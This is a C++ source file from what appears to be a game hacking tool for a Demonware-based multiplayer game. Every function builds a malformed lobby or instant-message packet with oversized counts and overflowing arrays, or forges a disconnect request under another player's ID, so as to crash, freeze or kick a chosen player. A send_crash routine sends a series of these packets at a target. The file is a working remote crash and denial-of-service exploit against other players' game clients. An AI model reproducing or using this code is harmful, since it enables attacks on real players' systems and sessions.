#include "dependencies/std_include.hpp"
#include "exploit.hpp"

namespace exploit
{
	namespace instant_message
	{
		void send_popup(const std::vector<std::uint64_t>& recipients)
		{
			if (game::Live_IsUserSignedInToDemonware(0))
			{
				const auto dummy{ 0 };
				game::send_instant_message(recipients, 'f', &dummy, sizeof dummy);
			}
		}

		void send_info_response_overflow(const std::vector<std::uint64_t>& recipients)
		{
			if (game::Live_IsUserSignedInToDemonware(0))
			{
				char buffer[0x400] = { 0 };
				game::msg_t msg{};

				events::lobby_msg::prep_lobby_msg(&msg, buffer, sizeof buffer, game::MESSAGE_TYPE_INFO_RESPONSE);

				uint32_t dummy{ 0 };
				game::LobbyMsgRW_PackageUInt(&msg, "nonce", &dummy);
				game::LobbyMsgRW_PackageInt(&msg, "uiscreen", reinterpret_cast<int*>(&dummy));
				game::LobbyMsgRW_PackageUChar(&msg, "nattype", reinterpret_cast<uint8_t*>(&dummy));

				game::LobbyMsgRW_PackageArrayStart(&msg, "lobbies");
				msg.write(12ui8);

				game::send_instant_message(recipients, 'h', msg);
			}
		}

		void send_friend_message_crash(const std::vector<std::uint64_t>& recipients)
		{
			const game::JoinSessionMessage message{ game::JOIN_REQUEST };
			game::send_instant_message(recipients, 'f', &message, sizeof message);
		}
	}

	namespace lobby_msg
	{
		void send_disconnect(const game::LobbySession* session, const std::uint64_t xuid)
		{
			if (session == nullptr)
				return;
			
			char buffer[0x20000] = { 0 };
			game::msg_t msg{};

			events::lobby_msg::prep_lobby_msg(&msg, buffer, sizeof buffer, game::MESSAGE_TYPE_LOBBY_CLIENT_DISCONNECT);
			
			int lobby_type = session->type;
			game::LobbyMsgRW_PackageInt(&msg, "lobbytype", &lobby_type);
			uint64_t target_xuid = xuid;
			game::LobbyMsgRW_PackageXuid(&msg, "xuid", &target_xuid);

			events::lobby_msg::send_to_host(session, msg, game::LOBBY_MODULE_HOST);
		}
		
		void send_disconnect_client(const game::LobbySession* session, const std::uint64_t xuid)
		{
			if (session == nullptr)
				return; 
			
			char buffer[0x20000] = { 0 };
			game::msg_t msg{};

			events::lobby_msg::prep_lobby_msg(&msg, buffer, sizeof buffer, game::MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);
			
			uint32_t data_mask{ 4u };
			game::LobbyMsgRW_PackageUInt(&msg, "datamask", &data_mask);
			int lobby_type = session->type;
			game::LobbyMsgRW_PackageInt(&msg, "lobbytype", &lobby_type);
			uint64_t target_xuid = xuid;
			game::LobbyMsgRW_PackageXuid(&msg, "discclientxuid", &target_xuid);
			int disconnect_type = game::LOBBY_DISCONNECT_CLIENT_BADDLC;
			game::LobbyMsgRW_PackageInt(&msg, "discclient", &disconnect_type);

			events::lobby_msg::send_to_host(session, msg, game::LOBBY_MODULE_HOST);
		}

		void send_connection_test(const game::LobbySession* session, const game::netadr_t& netadr, const std::uint64_t xuid)
		{
			if (const auto our_client_num = game::LobbySession_GetClientNumByXuid(session, game::LiveUser_GetXuid(0)); our_client_num >= 0)
			{
				char buffer[0x400] = { 0 };
				game::msg_t msg{};

				events::lobby_msg::prep_lobby_msg(&msg, buffer, sizeof buffer, game::MESSAGE_TYPE_PEER_TO_PEER_CONNECTIVITY_TEST);
				
				int lobby_type = session->type;
				game::LobbyMsgRW_PackageInt(&msg, "lobbytype", &lobby_type);
				int index = our_client_num;
				game::LobbyMsgRW_PackageInt(&msg, "index", &index);

				events::lobby_msg::send_to_client(game::LOBBY_MODULE_PEER_TO_PEER, msg, netadr, xuid);
			}
		}

		void send_modified_stats_crash(const game::netadr_t& netadr, const std::uint64_t xuid)
		{
			char buffer[0x200] = { 0 };
			game::msg_t msg{};

			events::lobby_msg::prep_lobby_msg(&msg, buffer, sizeof buffer, game::MESSAGE_TYPE_LOBBY_MODIFIED_STATS);
			
			int stats_size = 0x20000;
			game::LobbyMsgRW_PackageInt(&msg, "statssize", &stats_size);
			char stats_buffer[0x100] = { 0 };
			game::LobbyMsgRW_PackageGlob(&msg, "statsbuffer", &stats_buffer, sizeof stats_buffer);

			events::lobby_msg::send_to_client(game::LOBBY_MODULE_HOST, msg, netadr, xuid);
		}

		void send_voice_packet_crash(const game::netadr_t& netadr, const std::uint64_t xuid)
		{
			char buffer[0x400] = { 0 };
			game::msg_t msg{};

			events::lobby_msg::prep_lobby_msg(&msg, buffer, sizeof buffer, game::MESSAGE_TYPE_VOICE_PACKET);

			int dummy{ 0 };
			game::LobbyMsgRW_PackageInt(&msg, "lobbytype", &dummy);
			game::LobbyMsgRW_PackageUChar(&msg, "talker", reinterpret_cast<uint8_t*>(&dummy));
			game::LobbyMsgRW_PackageInt(&msg, "relaybits", &dummy);
			uint16_t voice_data_size = 1198 + sizeof(uint32_t);
			game::LobbyMsgRW_PackageUShort(&msg, "sizeofvoicedata", &voice_data_size);
			game::LobbyMsgRW_PackageUChar(&msg, "numpackets", reinterpret_cast<uint8_t*>(&dummy));
			char voice_data_buffer[0x100] = { 0 };
			game::LobbyMsgRW_PackageGlob(&msg, "voicedata", &voice_data_buffer, sizeof voice_data_buffer);

			events::lobby_msg::send_to_client(game::LOBBY_MODULE_HOST, msg, netadr, xuid);
			events::lobby_msg::send_to_client(game::LOBBY_MODULE_PEER_TO_PEER, msg, netadr, xuid);
		}

		void send_state_game_crash(const game::netadr_t& netadr, const std::uint64_t xuid)
		{
			if (game::LiveUser_IsXUIDLocalPlayer(xuid))
				return;
			
			char buffer[0x800] = { 0 };
			game::msg_t msg{};

			events::lobby_msg::prep_lobby_msg(&msg, buffer, sizeof buffer, game::MESSAGE_TYPE_LOBBY_STATE_GAME);

			game::Msg_LobbyStateGame data{};
			data.core.lobbyMode = game::LOBBY_MODE_CUSTOM;
			data.core.clientCount = 0x100;
			data.compressedBufferSize = 0x20000;

			game::MSG_LobbyStateGame(&data, &msg);

			events::lobby_msg::send_to_client(game::LOBBY_MODULE_CLIENT, msg, netadr, xuid);
		}

		void send_join_lobby_crash(const game::netadr_t& netadr, const std::uint64_t xuid)
		{
			char buffer[0x800] = { 0 };
			game::msg_t msg{};

			events::lobby_msg::prep_lobby_msg(&msg, buffer, sizeof buffer, game::MESSAGE_TYPE_JOIN_LOBBY);

			game::Msg_JoinParty data{};
			data.memberCount = 0x20000;

			game::MSG_JoinParty(&data, &msg);

			events::lobby_msg::send_to_client(game::LOBBY_MODULE_HOST, msg, netadr, xuid);
		}
		
		void send_server_info_overflow(const game::netadr_t& netadr, const std::uint64_t xuid)
		{
			char buffer[0x400] = { 0 };
			game::msg_t msg{};

			events::lobby_msg::prep_lobby_msg(&msg, buffer, sizeof buffer, game::MESSAGE_TYPE_SERVERLIST_INFO);

			uint8_t platform{ 0 };
			game::LobbyMsgRW_PackageUChar(&msg, "platform", &platform);

			game::LobbyMsgRW_PackageArrayStart(&msg, "lobbies");
			msg.write(12ui8);

			events::lobby_msg::send_to_client(game::LOBBY_MODULE_HOST, msg, netadr, xuid);
		}
	}
	
	void send_connect_response_migration_packet(const game::netadr_t& netadr)
	{
		PRINT_LOG("Sending connectResponseMigration packet to %s", utils::get_sender_string(netadr).data());
		game::oob::send(netadr, "connectResponseMigration");
	}
	
	void send_mstart_packet(const game::netadr_t& netadr)
	{
		PRINT_LOG("Sending mstart packet to %s", utils::get_sender_string(netadr).data());
		game::oob::send(netadr, "mstart");
	}

	void send_request_stats_packet(const game::netadr_t& netadr)
	{
		PRINT_LOG("Sending requeststats packet to %s", utils::get_sender_string(netadr).data());
		game::oob::send(netadr, "requeststats\n");
	} 

	void send_crash(const game::netadr_t& netadr, const std::uint64_t xuid, const bool freeze)
	{
		PRINT_LOG("Sending crash packets to %s", utils::get_sender_string(netadr).data());
		
		if (freeze)
		{
			lobby_msg::send_server_info_overflow(netadr, xuid); 
			instant_message::send_info_response_overflow({ xuid });
		}
		else
		{
			game::oob::send(netadr, "relay");
			game::oob::send(netadr, "vt");

			instant_message::send_friend_message_crash({ xuid });

			std::thread([=]()
			{
				lobby_msg::send_modified_stats_crash(netadr, xuid);
				std::this_thread::sleep_for(100ms);
				lobby_msg::send_voice_packet_crash(netadr, xuid);
				std::this_thread::sleep_for(100ms);
				lobby_msg::send_state_game_crash(netadr, xuid);
				std::this_thread::sleep_for(100ms);
				lobby_msg::send_join_lobby_crash(netadr, xuid);
			}).detach();
		}
	}
}